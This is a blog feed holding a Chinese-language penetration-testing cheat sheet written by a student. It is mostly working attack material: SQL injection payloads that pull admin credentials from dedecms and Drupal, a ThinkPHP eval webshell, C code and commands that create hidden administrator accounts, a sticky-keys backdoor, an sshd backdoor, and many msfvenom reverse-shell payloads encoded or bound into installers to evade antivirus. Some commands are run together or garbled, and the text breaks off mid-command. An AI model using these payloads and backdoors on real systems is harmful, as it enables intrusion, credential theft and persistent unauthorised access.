<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Dawn_whisper&#39;s blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-07-14T08:30:58.000Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Dawn_whisper</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>内网渗透笔记</title>
    <link href="http://example.com/2022/07/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/"/>
    <id>http://example.com/2022/07/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/</id>
    <published>2022-07-13T02:58:41.000Z</published>
    <updated>2022-07-14T08:30:58.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内网渗透笔记"><a href="#内网渗透笔记" class="headerlink" title="内网渗透笔记"></a>内网渗透笔记</h1><p>大一脑子进水报了卓越班，放暑假了还在这坐大牢，做一天和尚撞一天钟，记个笔记让我这个月有点收获吧（</p><hr><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-P 指定扫描端口</span><br><span class="line">-O 操作系统检测</span><br><span class="line">-A 操作系统版本检测</span><br><span class="line">-PE&#x2F;PP&#x2F;PM 使用ICMP echo&#x2F;ICMP timestamp&#x2F;ICMP netmask请求包发现主机</span><br><span class="line">-PS&#x2F;PA&#x2F;PU&#x2F;PY 使用TCP SYN&#x2F;TCP ACK&#x2F;SCTP INIT&#x2F;ECHO方式进行发现</span><br><span class="line">-sV 服务版本扫描</span><br><span class="line">-sn xxx.xxx.xxx.xxx&#x2F;24 C段扫描</span><br></pre></td></tr></table></figure><h3 id="git泄露"><a href="#git泄露" class="headerlink" title=".git泄露"></a>.git泄露</h3><blockquote><p>如果存在/.git页面则存在git泄露</p></blockquote><p>GitHack</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http://192.168.xxx.xxx/.git</span><br></pre></td></tr></table></figure><h3 id="svn泄露"><a href="#svn泄露" class="headerlink" title=".svn泄露"></a>.svn泄露</h3><blockquote><p>如果存在/.svn页面则存在svn泄露</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python SvnExploit.py -u http://192.168.xxx.xxx/.svn --dump</span><br></pre></td></tr></table></figure><h3 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h3><p>intruder爆破</p><h3 id="域名收集"><a href="#域名收集" class="headerlink" title="域名收集"></a>域名收集</h3><p>subDomainsBrute 子域名枚举</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 subDomainsBrute.py xxxxxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure><p>搜索引擎</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site: xxxxxxxxxxxxx</span><br></pre></td></tr></table></figure><p>Sublist3r-master 第三方聚合服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sublist3r.py -d xxxxxx -o xxxxxx.txt</span><br></pre></td></tr></table></figure><p>证书透明信息 <a href="https://crt.sh/">https://crt.sh</a></p><h3 id="获取真实IP"><a href="#获取真实IP" class="headerlink" title="获取真实IP"></a>获取真实IP</h3><blockquote><ol><li><p>ping</p></li><li><p>nslookup</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nslookup xxxxxxx 8.8.8.8</span><br><span class="line">nslookup xxxxxxx 114.114.114.114</span><br></pre></td></tr></table></figure><ol start="3"><li>等</li></ol></blockquote><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="web漏洞扫描"><a href="#web漏洞扫描" class="headerlink" title="web漏洞扫描"></a>web漏洞扫描</h3><p>nikto 扫描器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -host http://xxxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure><p>sqlmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://xxxxxx --level 3</span><br></pre></td></tr></table></figure><h3 id="弱口令扫描"><a href="#弱口令扫描" class="headerlink" title="弱口令扫描"></a>弱口令扫描</h3><p>Hydra</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-l 指定单个用户名</span><br><span class="line">-L 指定多个用户名文件</span><br><span class="line">-P 指定多个密码文件</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -U ssh</span><br><span class="line">hydra xxx.xxx.xxx.xxx ssh -l root -P <span class="string">&#x27;xxxxxxxxxx&#x27;</span> -V</span><br></pre></td></tr></table></figure><p>Metasploit</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msfconsole 进入metasploit</span><br><span class="line">search ssh_login 搜索相关模块</span><br><span class="line">use xxxxxxxxxxxxxxx 使用某模块</span><br><span class="line">show options 展示配置参数</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> rhost xxx.xxx.xxx.xxx</span><br><span class="line"><span class="built_in">set</span> user_file /root/user.txt</span><br><span class="line"><span class="built_in">set</span> pass_file /root/pass.txt</span><br><span class="line"><span class="built_in">set</span> threads 5</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="google-hacking"><a href="#google-hacking" class="headerlink" title="google hacking"></a>google hacking</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">intext: 正文关键字</span><br><span class="line">intitle: 标题关键字</span><br><span class="line">allintitle: 多个标题关键字</span><br><span class="line">inurl: url关键字</span><br><span class="line">allinurl: 多个url关键字</span><br><span class="line">site: 指定访问站点</span><br><span class="line">filetype: 文件类型</span><br><span class="line">link: 指定链接</span><br><span class="line">related: 布局相似</span><br><span class="line">cache: 谷歌快照</span><br><span class="line">info: 指定信息</span><br><span class="line">define: 词语定义</span><br><span class="line">phonebook: 电话信息</span><br><span class="line">Index of: 发现允许目录浏览的web网站</span><br></pre></td></tr></table></figure><h3 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h3><p>搜索引擎</p><h3 id="系统漏洞扫描"><a href="#系统漏洞扫描" class="headerlink" title="系统漏洞扫描"></a>系统漏洞扫描</h3><p>Nessus</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/nessusd start</span><br><span class="line">netstat -ntpl | grep nessus</span><br></pre></td></tr></table></figure><p>本地访问即可</p><p>MetaSploitFramework</p><p>同上利用即可</p><h2 id="web渗透测试"><a href="#web渗透测试" class="headerlink" title="web渗透测试"></a>web渗透测试</h2><h3 id="dedecms"><a href="#dedecms" class="headerlink" title="dedecms"></a>dedecms</h3><p>测试payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;plus&#x2F;search.php?keyword[ uNion ]&#x3D;a</span><br></pre></td></tr></table></figure><blockquote><p>Request Error step 1 !</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;plus&#x2F;search.php?keyword&#x3D;as&amp;typeArr[111%3D@&#96;\&#39;&#96;)+and+(SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(substring((select+CONCAT(0x7c,userid,0x7c,pwd)+from+&#96;%23@__admin&#96;+limit+0,1),1,62)))a+from+information_schema.tables+group+by+a)b)%23@&#96;\&#39;&#96;+]&#x3D;a</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>Request Error step 2 !</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;plus&#x2F;search.php?keyword&#x3D;as&amp;typeArr[111%3D@&#96;\&#39;&#96;)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,userid,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,pwd,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+&#96;%23@__admin&#96;%23@&#96;\&#39;&#96;+]&#x3D;a</span><br></pre></td></tr></table></figure></blockquote><h3 id="Drupalcms"><a href="#Drupalcms" class="headerlink" title="Drupalcms"></a>Drupalcms</h3><p>sql注入payload</p><p>爆库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pass&#x3D;lol&amp;form_build_id&#x3D;&amp;form_id&#x3D;user_login_block&amp;op&#x3D;Log+in&amp;name[0 or updatexml(0,concat(0xa,user()),0)%23]&#x3D;bob&amp;name[0]&#x3D;a</span><br></pre></td></tr></table></figure><p>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lol&amp;form_build_id&#x3D;&amp;form_id&#x3D;user_login_block&amp;op&#x3D;Log+in&amp;name[0 or updatexml(0,concat(0xa,(SELECT table_name FROM information_schema.tables WHERE table_schema like database() limit 70,1)),0)%23]&#x3D;bob&amp;name[0]&#x3D;a</span><br></pre></td></tr></table></figure><p>爆字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lol&amp;form_build_id&#x3D;&amp;form_id&#x3D;user_login_block&amp;op&#x3D;Log+in&amp;name[0 or updatexml(0,concat(0xa,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema like database()and table_name like ‘users’ )),0)%23]&#x3D;bob&amp;name[0]&#x3D;a</span><br></pre></td></tr></table></figure><p>爆内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lol&amp;form_build_id&#x3D;&amp;form_id&#x3D;user_login_block&amp;op&#x3D;Log+in&amp;name[0 or updatexml(0,concat(0xa,substring((SELECT group_concat(name,’’,pass) FROM users),1,60)),0)%23]&#x3D;bob&amp;name[0]&#x3D;alol&amp;form_build_id&#x3D;&amp;form_id&#x3D;user_login_block&amp;op&#x3D;Log+in&amp;name[0 or updatexml(0,concat(0xa,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema like database()and table_name like ‘users’ )),0)%23]&#x3D;bob&amp;name[0]&#x3D;a</span><br></pre></td></tr></table></figure><h3 id="struts2"><a href="#struts2" class="headerlink" title="struts2"></a>struts2</h3><p>略</p><h3 id="ThinkPHP2"><a href="#ThinkPHP2" class="headerlink" title="ThinkPHP2"></a>ThinkPHP2</h3><p>路由解析问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;index.php?s&#x3D;a&#x2F;b&#x2F;c&#x2F;$&#123;@phpinfo()&#125;</span><br><span class="line">http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;index.php?s&#x3D;a&#x2F;b&#x2F;c&#x2F;$&#123;@print(eval($_POST[1]))&#125;</span><br></pre></td></tr></table></figure><h2 id="攻防技术"><a href="#攻防技术" class="headerlink" title="攻防技术"></a>攻防技术</h2><h3 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h3><p>注就完了</p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>略</p><h3 id="绕过防火墙"><a href="#绕过防火墙" class="headerlink" title="绕过防火墙"></a>绕过防火墙</h3><p>http协议覆盖绕过（编码等）</p><p>pipline绕过（一次发俩包）</p><p>分块传输绕过（把post部分分块）</p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="环境变量劫持"><a href="#环境变量劫持" class="headerlink" title="环境变量劫持"></a>环境变量劫持</h4><p>在root的SUID下的程序里调用cat，新建一个cat，写进去shell，再把环境变量写在前面去，然后回去运行，即可拿到shell</p><h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure><h4 id="内核漏洞"><a href="#内核漏洞" class="headerlink" title="内核漏洞"></a>内核漏洞</h4><p>搜就完事</p><h4 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure><p>利用find可以执行其他命令等</p><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h4 id="PATH环境变量配置错误"><a href="#PATH环境变量配置错误" class="headerlink" title="PATH环境变量配置错误"></a>PATH环境变量配置错误</h4><p>exp.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    i=system(<span class="string">&quot;net user as Admin@123. /add&quot;</span>);</span><br><span class="line">    j=system(<span class="string">&quot;net localgroup administrator as /add&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i686-w64-mingw32-gcc exp.c -o Common.exe -mwindows</span><br></pre></td></tr></table></figure><p>编译成<code>ipconfig.exe</code>丢入PATH下，执行命令即可</p><h4 id="Trusted-Service-Paths"><a href="#Trusted-Service-Paths" class="headerlink" title="Trusted Service Paths"></a>Trusted Service Paths</h4><p>把上面的exp编译成<code>Common.exe</code>，放在含有空格的地方等待重启即可</p><h4 id="计划任务-1"><a href="#计划任务-1" class="headerlink" title="计划任务"></a>计划任务</h4><p>写入<code>restart.bat</code>里等</p><h3 id="第三方"><a href="#第三方" class="headerlink" title="第三方"></a>第三方</h3><h4 id="Serv-U"><a href="#Serv-U" class="headerlink" title="Serv-U"></a>Serv-U</h4><p>exp直接入（</p><p>先修改<code>ServUDaemon.ini</code>注册文件，直接加个用户上去，然后ftp连接加进管理员<code>hack</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">quote site <span class="built_in">exec</span> net user hack Admin@123. /add</span><br><span class="line">quote site <span class="built_in">exec</span> net localgroup administrators hack /add</span><br></pre></td></tr></table></figure><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><h3 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h3><h4 id="隐藏账户"><a href="#隐藏账户" class="headerlink" title="隐藏账户"></a>隐藏账户</h4><p>在用户名称后面加$即可隐藏</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user hack$ 123456Pp. /add &amp;&amp; net localgroup administrators hack$ /add</span><br></pre></td></tr></table></figure><p>可去<code>管理/配置/本地用户和组/用户</code>中查看</p><h4 id="编辑注册表"><a href="#编辑注册表" class="headerlink" title="编辑注册表"></a>编辑注册表</h4><p>从注册表里导出，替换F字段的值，下次直接导入注册表即可</p><h4 id="shilft后门"><a href="#shilft后门" class="headerlink" title="shilft后门"></a>shilft后门</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe</span><br></pre></td></tr></table></figure><p>覆盖掉粘滞快捷键即可</p><h4 id="Windows隐藏文件"><a href="#Windows隐藏文件" class="headerlink" title="Windows隐藏文件"></a>Windows隐藏文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">attrib test.txt +s +h</span><br><span class="line">attrib test.txt -s -h -r</span><br></pre></td></tr></table></figure><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>注册表启动键值、Windows启动项、Windows计划任务、sc命令创建新服务</p><h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><h4 id="SSHD软连接"><a href="#SSHD软连接" class="headerlink" title="SSHD软连接"></a>SSHD软连接</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/ssh/sshd_config | grep UsePAM</span><br><span class="line">mkdir /run/sshd</span><br><span class="line">ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=1234</span><br></pre></td></tr></table></figure><p>等</p><h4 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h4><p>启动项、计划任务、SUID后门、公钥免密登陆、Strace后门、进程注入</p><h3 id="免杀技术"><a href="#免杀技术" class="headerlink" title="免杀技术"></a>免杀技术</h3><h4 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h4><p>编码器免杀</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=2222 -e x86/shikata_ga_nai -b “\x00” -i 16 -f exe -o test.exe</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=2222 -e x86/shikata_ga_nai -i 10 -f raw | msfvenom -e x86/alpha_upper -a x86 --platform windows -i 5 -f raw | msfvenom -e x86/shikata_ga_nai -a x86 --platform windows -i 10 -f raw |msfvenom -e x86/countdown -a x86 --platform windows -i 10  -f exe -o test1.exe</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=2222 -e x86/shikata_ga_nai-x /root/nppInstaller.exe -i 5 -f exe -o nppinstaller2.exe</span><br></pre></td></tr></table></figure><p>upx套壳</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=2222 -e x86/shikata_ga_nai –i 10 –f exe –o upxtest.exe</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upx -5 upxtest.exe –k</span><br></pre></td></tr></table></figure><p>MSF开启监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload &lt;payload_name&gt;</span><br><span class="line"><span class="built_in">set</span> LHOST &lt;lhost_value&gt;</span><br><span class="line"><span class="built_in">set</span> LPORT &lt;lport_value&gt;</span><br><span class="line"><span class="built_in">set</span> exitonsession <span class="literal">false</span></span><br><span class="line">exploit -j -z</span><br></pre></td></tr></table></figure><p>生成二进制后门</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure><p>生成web后门</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.phpcat shell.php | pbcopy &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;&lt;?php &#x27;</span> | tr -d <span class="string">&#x27;\n&#x27;</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure><p>生成脚本后门</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jspmsfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure><p>生成shellcode后门</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure><p>msfvenom常用的使用格式命令</p><p>普通生成</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p -f -o msfvenom -p windows/meterpreter/reverse_tcp -f exe -o C:\back.exe</span><br></pre></td></tr></table></figure><p>编码处理型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -i 3 -e x86/shikata_ga_nai -f exe -o C:\back.exe</span><br></pre></td></tr></table></figure><p>捆绑</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -platform windows -a x86 -x C:\nomal.exe -k -f exe -o C:\shell.exe</span><br></pre></td></tr></table></figure><p>Windows</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -i 3 -e x86/shikata_ga_nai -f exe -o C:\back.exe</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o C:\back.exe</span><br></pre></td></tr></table></figure><p>Linux</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure><p>Mac</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure><p>PHP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw &gt; shell.php</span><br></pre></td></tr></table></figure><p>Asp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure><p>Aspx</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f aspx &gt; shell.aspx</span><br></pre></td></tr></table></figure><p>Jsp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure><p>War</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war &gt; shell.war</span><br></pre></td></tr></table></figure><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST= LPORT=-f raw &gt; shell.sh</span><br></pre></td></tr></table></figure><p>Perl</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= 